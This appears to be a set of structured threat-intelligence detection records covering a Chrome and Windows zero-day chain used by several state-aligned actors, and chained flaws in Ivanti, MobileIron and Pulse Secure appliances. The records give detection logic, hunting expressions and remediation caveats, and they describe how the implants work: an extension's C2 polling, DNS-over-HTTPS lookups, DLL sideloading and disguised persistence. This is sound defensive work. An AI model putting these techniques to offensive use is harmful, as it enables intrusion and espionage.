how.logic: The extension registers itself against a fixed API surface before doing anything else, so the registration path is the cheapest thing to look for. It first queries a public address lookup service because the victim identifier it builds embeds the host's public IP address, then posts to a registration path to obtain an identifier and token, then polls a cadence flag and a set of per-victim paths on a fixed interval of either 30 seconds or 60 minutes, posting collected data to an ingest path and screenshots to a separate path.

markers.note: the extension's whole fixed API surface in one test, unanchored because the field holds a full URL rather than a bare path. The registration path is plural and the per-victim paths are singular with the victim identifier as the second segment; the trailing alternation also covers the command acknowledgement path /api/extension/{id}/commands/{commandId}/ack. Kept as one clause because a single request matches exactly one of these and a rule that conjoins them matches nothing.

markers.expr: registration request carries a victim identifier of the form gemini-<12 characters>-<public IP address>

markers.note: command and control hostnames for the GemStone extension, TA412

how.caveat: The two public address lookup services the extension queries to build its victim identifier are used constantly by legitimate software and are deliberately carried in the logic rather than as markers; the API paths are the discriminators. The cadence flag lets the operator drop the implant to one poll an hour, so a baseline window shorter than that will see nothing, and the extension collects after decryption and after authentication so no network content shows what it took. This block sees traffic only. The install is covered by the forged-preferences block in this record, and the browser's own extension inventory is not a detection source for it, because the installer recomputes the checksums the browser verifies.

how.logic: Three of the four campaigns used provider-issued hostnames under workers.dev, or a Cloudflare R2 bucket hostname, to serve the exploit page, the follow-on downloads or the command channel, reached as a link in a phishing message. The publisher states that in every observed case the delivery infrastructure was created on the same day as the associated campaign or in the days immediately preceding it, so first-seen age of the hostname is a usable discriminator where registration age is not, the parent domain being old and reputable.

markers.expr: hostname first observed in the estate on the same day as, or in the days immediately preceding, the message or request that referenced it
markers.note: the publisher states only that in every observed case the delivery infrastructure was created on the same day as the associated campaign or in the days immediately preceding it, and gives no interval. The bound is measured against the estate's own first-seen data and is left unresolved here.

how.caveat: Developers use these namespaces for genuine work, so on an engineering estate this alerts on real activity and needs an allow list. The mail path is where it is worth the noise, since a link into one of these namespaces arriving in a message has no ordinary business explanation. The fourth campaign did not use them at all, preferring registered domains that spoofed the names of its targets, so this covers three of the four and not the pattern as a whole.

iocs.note: BlueMoon exploit delivery, download and command hostname, UNK_QuietRacket
the Cloudflare Worker the first TXT lookup resolved to, UNK_QuietRacket

how.logic: The loader carries no command-and-control address. It resolves a TXT record for a fixed lookup hostname over DNS-over-HTTPS against a public resolver, decrypts the answer with ChaCha20 and obtains the hostname to contact, then repeats the same pattern against a second lookup hostname in an indefinite beacon loop. Because the lookup travels over HTTPS to a public resolver it never reaches the estate's own resolver and never appears in its DNS logs, so the observable is a process other than a browser making DNS-over-HTTPS requests, not the TXT query itself.

markers.expr: process issuing DNS-over-HTTPS requests to a public resolver is not a browser and is not the configured system resolver
DNS-over-HTTPS request followed within minutes by a first-seen outbound destination on the same host

iocs.note: lookup hostname whose TXT record encoded the command and control endpoint; carried as an indicator rather than a marker because the query travels inside HTTPS to a public resolver and never reaches the estate's own DNS logs

lookup hostname whose TXT record encoded the command and control endpoint; carried as an indicator rather than a marker because the query travels inside HTTPS to a public resolver and never reaches the estate's own DNS logs

lookup hostname whose TXT record encoded the command and control endpoint; carried as an indicator rather than a marker because the query travels inside HTTPS to a public resolver and never reaches the estate's own DNS logs
registrable domain of the lookup hostname above
registrable domain of the lookup hostname above
registrable domain of the lookup hostname above
GFExperienceUpdate.dll, the loader performing the lookup

how.caveat: Observed in one of the four campaigns only. Browsers perform DNS-over-HTTPS by default in many configurations, so the requesting process is the discriminator and the protocol is not. Where the estate's resolver is out of the path the TXT lookup is invisible by design, which is why this needs endpoint telemetry rather than DNS logs. The lookup hostnames rotate; the shape of a non-browser process resolving over DNS-over-HTTPS does not.

how.logic: Three of the four campaigns dropped a legitimately named executable together with a malicious library of the name it loads into the same directory, then ran the executable so the library loaded from beside it rather than from the system location. Two of those three also dropped a separate encrypted data file which the sideloaded library decrypts and loads in memory, so the payload is never written to disk in a runnable form: A08744D2.tmp decrypted with AES in the UNK_LateNight chain, and SysPr.prx decrypted with RC4 in the UNK_DoubleCheck chain. The third fetched its payload over the network instead, resolving its command and control over DNS-over-HTTPS and loading a .NET assembly served from a decoy web page, so no encrypted blob is written beside its pair. The UNK_LateNight chain additionally wrote the decrypted payload to the registry as a fallback and overwrote the data file immediately.

markers.note: sideloaded libraries named by the publisher; calibre-launcher.dll and krita.dll in the UNK_DoubleCheck chain, GFExperienceUpdate.dll in the UNK_QuietRacket chain
the executables downloaded and run beside those libraries as sideloading pairs

SysPr.prx is the RC4-encrypted blob the UNK_DoubleCheck chain decrypts in memory, and A08744D2.tmp the AES-encrypted file the UNK_LateNight chain decrypts. 85rY.dat was downloaded alongside the UNK_DoubleCheck pair and the publisher does not state its role.
the path the UNK_QuietRacket in-memory .NET payload set its scheduled task to execute; a persistence artefact rather than a property of the sideloading pair's own write

markers.expr: executable and a library it loads were written to the same user-writable directory within minutes of each other and the library is not in the system library location

iocs.note: command and control for the second sideloading set, UNK_DoubleCheck

how.caveat: The library names, the executable names, the encrypted-file names and the persistence path are alternatives drawn from three different chains and from different events within them, not properties of one event; a rule that conjoins them matches nothing. Portable applications legitimately ship their libraries beside their executables, so a library loading from beside its executable is not on its own an anomaly. The discriminator is a fresh executable and library pair written together into a user-writable directory minutes before the executable runs, which is the computed marker here. The fourth campaign used a browser extension instead of a sideloading chain and is not covered by this.

how.logic: The follow-on stages persist under names chosen to read as vendor update or security services. The publisher names four scheduled tasks across three campaigns, one mutex and one registry class identifier InprocServer32 write. Sweep for the literals, and separately review scheduled tasks whose names imitate an update service but whose action points at a user-writable directory rather than at the vendor's installation directory.

markers.note: EdgeCore_AutoUpdate in the UNK_LateNight chain; MicrosoftEdgeUpdatesTaskMachine and Avpcheckup in the UNK_DoubleCheck chain; GeForceService set by the UNK_QuietRacket in-memory payload
UNK_DoubleCheck
UNK_DoubleCheck persistence

markers.expr: scheduled task whose name resembles a vendor updater has an action path outside that vendor's installation directory

how.caveat: These are campaign literals with a short shelf life and they are not durable detections on their own. One of the task names differs only slightly from a genuine browser updater task name, so match the names exactly rather than by substring or an alert will fire on the real updater. The publisher's hunting list attributes two of these tasks to a campaign whose narrative section does not otherwise mention them. Neither the scheduled task names nor the mutex resolves to a default field in the handoff, so a consumer supplies the field for its own estate or answers both as a host sweep rather than as a streaming rule.

how.logic: Both browser flaws in this chain were fixed in public upstream open-source code before the fix reached the stable builds users actually run, and the publisher assesses it likely that the exploit developer worked from those public commits. For one of them the commit landed on 7 August 2026 and the general stable build carrying it shipped on 3 September 2026, leaving a window of nearly four weeks in which the fix was readable by anyone and installable by nobody. Treat the upstream commit date, not the downstream release date and not the advisory date, as the start of the exposure window for any product built on an open-source upstream, and measure the estate's own interval from a stable release becoming available to it being deployed.

markers.note: the publisher gives no bound for this interval. It is measured against the estate's own deployment records and read against the only upstream-to-stable lag the publisher dates, 7 August to 3 September 2026 for CVE-2026-85046.

markers.expr: count(managed_browser_installations running a build older than the current stable release)

how.caveat: This changes patch scheduling and the start date of a retrospective hunt rather than adding a query, and nothing in it is observable in defender telemetry. The window is also not visible from the outside: during it there is no advisory to alert on and no public proof of concept to point at, and the absence of one is not evidence of lower risk, because the upstream commit is the proof of concept. The publisher dates the commit and the stable rollout for one of the two browser flaws only.

where.title: Once in a BlueMoon: Multiple State-Aligned Threat Actors Rapidly Adopt Novel Exploit Chain Using Chrome and Windows Zero-Days

notes: One record for the browser, which is the technology the chain was aimed at. The Windows kernel privilege escalation component (CVE-2026-85880), which the publisher says was gated to builds 17763, 19041 to 19045, 20348 and 22000 and whose library carried an unforged 2025 compilation timestamp, is a separate technology and warrants its own record. Four campaigns are deliberately kept in one record because the publisher states they share one exploit kit with identical orchestration and loading, but every post-exploitation marker is attributed to its own campaign in the marker notes and must not be carried across: the browser extension belongs to the TA412 campaign only, the sideloading chains to the other three. Attribution confidence is medium rather than high because the publisher calls TA412 and UNK_LateNight China-aligned without hedge, calls UNK_QuietRacket a suspected China-aligned actor, does not attribute UNK_DoubleCheck to any country, and states there is not sufficient evidence to attribute use of the kit exclusively to China-aligned actors. The publisher lists several artefacts it considers consistent with AI-assisted development of the kit and states plainly that none of them confirms it; that assessment is recorded here as the publisher's and is not used as the basis of any detection. The publisher also states it is unknown how four distinct actors obtained the kit.

what.summary: A remote code execution flaw in mobile device management software, named among the most routinely exploited vulnerabilities of 2020 and commonly exploited by state actors. A device management platform holds administrative reach over every enrolled device, so the blast radius is the mobile estate rather than the server.

notes: Device management platforms are worth ranking above their severity score because compromise converts into control of every managed endpoint.

who.versions_affected: Builds vulnerable to CVE-2024-8963, CVE-2024-9379, CVE-2024-8190, CVE-2024-9380, CVE-2024-9381; separately CVE-2025-0282 and CVE-2025-0283 in Connect Secure

what.summary: Threat actors chained four separate appliance vulnerabilities along two distinct exploit paths to gain initial access, execute code remotely, obtain credentials and implant web shells, combining an administrative bypass with a SQL injection and two remote code execution flaws.

how.logic: Two separate chains were used against the same appliance family, each combining an administrative bypass with a code execution or injection flaw. That has a practical consequence for patching: fixing one vulnerability in a chain may not close the path if another chain exists through the remaining flaws. Treat a chained advisory as requiring all named fixes rather than triaging them individually by severity, because the bypass on its own may score low while being the component that makes the others reachable.

fields.note: all of them, not the highest-scoring subset
requests reaching administrative endpoints with no preceding authentication event for that session

how.caveat: An administrative bypass often scores lower than the code execution it enables, so severity-ranked patching can leave a chain open. This is a real failure mode of scoring-based prioritisation.

markers.note: raw field cve_id

how.logic: Web shells were implanted on the appliances, so the check is for files no vendor release installed. On an appliance this means the vendor integrity facility or an out-of-band examination, because no endpoint agent runs there.
how.caveat: An appliance an attacker controls may not report honestly on its own filesystem. Treat a failure as conclusive and a pass as reassurance rather than proof.

how.logic: Credentials were obtained during exploitation, so patching alone leaves the actor holding valid ones. Verify that every credential that authenticated through the appliance during the exposure window was rotated after the patch, not before it.
how.caveat: The most commonly skipped recovery step, and it is the one that decides whether the intrusion actually ended.

where.title: Threat Actors Chained Vulnerabilities in Ivanti Cloud Service Appliances

notes: The third distinct Ivanti product line in this corpus after Connect Secure and Policy Secure, and the second occasion this vendor's appliances appear as a state-sponsored or opportunistic initial access route. Recorded separately from the existing Connect Secure record because it is a different product with a different vulnerability set, but the pattern across both is the same asset class.

who.versions_affected: Builds vulnerable to CVE-2023-46805 and CVE-2024-21887

what.summary: A remote access appliance authentication bypass chained with a command injection flaw gave unauthenticated code execution, and was used by state-sponsored actors as part of large-scale network compromise for espionage. A third flaw extended the chain. Separately, seven national authorities determined that actors can deceive the vendor's own internal and external integrity checking tools so that compromise is not detected, and one authority reproduced in a lab that root-level persistence may survive factory resets. All supported version lines were affected.

how.logic: The chain pairs an authentication bypass with a command injection, so requests reaching an authenticated endpoint without a preceding successful authentication are the shape to look for. That framing survives the specific paths changing, which matters because these appliances have had several distinct flaws in quick succession.

fields.note: requests to authenticated endpoints with no corresponding authentication event for that session

how.caveat: Requires the appliance to log enough to correlate a request with a session. Where it does not, this reduces to watching for the specific published paths, which decays as the paths change.

how.logic: The vendor shipped an integrity checking tool for exactly this situation, and running it is the practical check for whether an appliance carries anything a release did not put there.
how.caveat: The vendor tool has had cases where a compromised device could influence its result, so a clean report is weaker evidence than a dirty one. Treat a failure as conclusive and a pass as reassuring rather than proof.

how.logic: An appliance that terminates remote access sessions holds the credentials and keys used to authenticate through it, so recovery requires rotating those as well as patching. Confirm rotation dates postdate the patch.
how.caveat: The step most often skipped. Patching a compromised appliance without rotating leaves the intruder holding valid credentials that no detection will question.

how.logic: The authoring organisations determined that actors are able to deceive both the internal and the external integrity checking tool, resulting in a failure to detect compromise, and one authority independently reproduced this in a lab and stated the tool is not sufficient to detect compromise. A clean result therefore carries no information. The fallback is evidence the appliance does not control: outbound sessions from its own address, authentication behaviour of accounts it holds, and traffic seen by adjacent devices.
how.caveat: This inverts a control that most appliance runbooks in this corpus depend on, including the integrity-mismatch detection cited by the other appliance records. After a clean result the honest status is unknown, not clean. The authoring organisations instruct treating stored user and service account credentials as compromised regardless of the tool's verdict.

how.logic: A national authority validated in a lab that an actor may be able to gain root-level persistence despite factory resets being issued. That removes the standard remediation for a suspect appliance, leaving replacement of the unit, or rebuild from vendor media with the device isolated, followed by rotation of every credential it held.
how.caveat: A reset that appears to succeed and returns the appliance to service is worse than no action, because it converts an open question into a false assurance. Replacement is the safe answer; continued monitoring of a reset unit is the minimum.

where.title: Countering Chinese State-Sponsored Actors Compromise of Networks to Feed Global Espionage System

corroborations.publisher: CISA, FBI, MS-ISAC, ACSC, NCSC-UK, Canadian Centre for Cyber Security, NCSC-NZ and CERT NZ

notes: Also referenced in the industrial-sector material in this corpus, where a separate actor used the same appliance family for initial access. The pattern across both is that a remote access appliance is the single most reliable initial access route for state-sponsored operators, which is why it appears in more records here than any other technology class. Extended with the seven-nation follow-up advisory, which is the most consequential remediation finding in the corpus: the vendor's integrity checker can be deceived and root persistence may survive a factory reset. Both of the two things a responder would normally do to an appliance after a suspected compromise are therefore unreliable here, which is why the caveat on the appliance integrity pattern was rewritten to lead on false negatives rather than false positives.

who.versions_affected: Endpoint Manager Mobile, formerly MobileIron Core, before the fixes released 23 and 28 July 2023

what.summary: State actors exploited an authentication bypass in a mobile device management platform as a zero day for at least three months, gathering information from several Norwegian organisations and compromising a government agency network. The flaw gave unauthenticated access to specific API paths, yielding personal data, configuration change, package deployment to enrolled devices and location data. It was chainable with a directory traversal flaw allowing arbitrary file write as the web application server, which turns information access into code execution.

how.logic: The bypass permits unauthenticated requests to specific API paths. So the marker is a successful response on those routes where the request carried no session cookie and no authorisation header. Because the web tier records both the route and the absence of the header, this is answerable retrospectively against retained logs as well as prospectively, which matters when the flaw was exploited for three months before a fix existed.
how.caveat: A web log configuration that does not retain headers cannot answer this at all. Confirm what your access logs actually keep before treating the query as available.

how.logic: The first flaw yields administrative-equivalent API access; the second lets an actor with administrator privilege write arbitrary files with the privileges of the web application server, which is how a web shell gets placed and executed. Patching only the higher-scoring flaw leaves the chain usable, and the vendor released the two fixes five days apart, so an organisation that patched promptly on the first date was still exposed.
how.caveat: Two fixes five days apart is the practical hazard: the change record shows the product was patched, and the estate was still open. Reconcile against both identifiers, not against the product.

how.logic: The advisory is explicit that these platforms are attractive because they provide elevated access to thousands of mobile devices, and that a previous flaw in the same product was also exploited by state actors. What the access yields is worth listing precisely: personal data on every enrolled user, configuration change, new packages pushed to endpoints, and location data where enabled. Alert on deployment tasks touching an unusual proportion of the estate.
how.caveat: The threshold has to be set from your own enrolment count and normal deployment sizes; the value here is a placeholder. Note also that location data makes physical tracking of staff an outcome of a network intrusion, which is rarely in a threat model.

how.logic: Exploitation ran from at least April 2023 to July 2023 as a zero day, so no patch existed for the whole exploitation window and no vulnerability scan would have flagged it. The advisory's response is to instruct organisations to hunt using the supplied guidance whether or not compromise is suspected, and to patch regardless of the hunt result.
how.caveat: The strategic point is that for a three-month zero day, patch compliance reporting would have shown green throughout. The only thing that would have helped is retained web logs and a hunt, which is an argument about retention rather than about patching.

notes: Pairs directly with the earlier MobileIron exposure record in this corpus: the advisory notes state actors had already exploited a previous flaw in the same product, which makes this a repeat-offender platform rather than an isolated event. The class lesson is that device management platforms deserve ranking above their severity score, because the platform is the blast radius, and because in this case that radius included the physical location of staff.

who.versions_affected: Versions vulnerable to CVE-2019-11510; separately CVE-2021-22893, CVE-2021-22894, CVE-2021-22899 and CVE-2021-22900

what.summary: An arbitrary file reading flaw in a remote access appliance let actors steal the unencrypted credentials of every user on the server. It was among the most routinely exploited vulnerabilities of 2020 and was frequently targeted by state actors, including against organisations involved in vaccine development. The advisory states plainly that stolen credentials retain access after the system is patched unless every one of them is changed.

how.logic: The flaw yields every user's credentials in clear, so patching closes the route in and changes nothing about what was taken. Remediation is three actions, not one: apply the fix, rotate every credential the appliance held including any service and directory accounts it authenticated against, and invalidate live sessions. Subsequent use of a stolen credential is an ordinary successful authentication, so there is no detection that substitutes for having rotated.
how.caveat: The gap this describes is a records problem as much as a technical one: the ticket closes on the patch, and whether rotation happened is often not written down anywhere. Where the appliance authenticated against a directory, the rotation scope is the directory rather than the appliance.

how.logic: This product family appears on the routinely exploited lists for consecutive years, with a fresh set of flaws in 2021 following the 2019 one. The appliance's own logs are the first place exploitation attempts show, which requires them to be forwarded off the appliance before they are needed.
how.caveat: A product with a track record across multiple annual lists deserves treating each new advisory as expected rather than exceptional.

how.logic: Four of the most targeted vulnerabilities of 2020 were in remote work, virtual private network or cloud technologies, and a majority of that year's top vulnerabilities had been disclosed within the preceding two years. Joining the published catalogue to the device inventory covers this class without needing to track individual advisories.
how.caveat: Remote access appliances are the highest-yield entries on that list every year in this corpus, so weight them above their severity scores.

notes: Recorded separately from the annual list record because the durable lesson is not which vulnerabilities were on the list but that for credential-disclosure flaws the patch is not the remediation. This is the most commonly incomplete remediation in the corpus, and it is invisible afterwards because the stolen credential's later use is indistinguishable from ordinary use.

who.versions_affected: Multiple releases across successive identifiers; each fix addressed one path and the class continued

what.summary: Successive identifiers in the same remote access product, repeatedly memory corruption in code that handles requests before any authentication, alongside an authentication bypass chained with command injection in the earlier pair. Across the wider product set a second class recurs independently, which is pre-authentication command injection in the mobile management and gateway products. One of these was assessed by the vendor as not exploitable because the characters an attacker could supply were limited to digits and full stops, and it was exploited in the wild anyway.

how.logic: A memory corruption attempt that does not land leaves a signature the exploit itself does not: the appliance stops answering mid-exchange and the service restarts. Correlate a request against the appliance with the absence of a response to it and a restart shortly after, and the detection holds whichever parsing path the next identifier turns out to use. In the case examined, a patched appliance answers with a client error while a vulnerable one closes the connection without replying, which makes the absence of a response the discriminator rather than any status code.

fields.note: the trigger for one identifier in this class; oversized and restricted to digits and full stops

how.caveat: The oversized header is the marker that expires, because it is one identifier's trigger and the next will use a different field; the crash correlation is the part that carries forward. A successful exploitation may produce no crash at all, so this catches attempts and failures rather than confirming compromise, and a quiet period after a burst of resets deserves more attention than the resets themselves. Restart records must come from somewhere other than the appliance where possible.

how.logic: The earlier pair in this product was an authentication bypass that made a command injection reachable, and only the pair together produces the outcome. For detection this means watching for requests that reach administrative or command endpoints with no authentication event recorded for that session, rather than watching for either component separately.
how.caveat: Scoring each component separately is the failure mode: the bypass scores low on its own and is the part that makes the other reachable, so a prioritisation process that treats them independently will defer exactly the fix that breaks the chain.
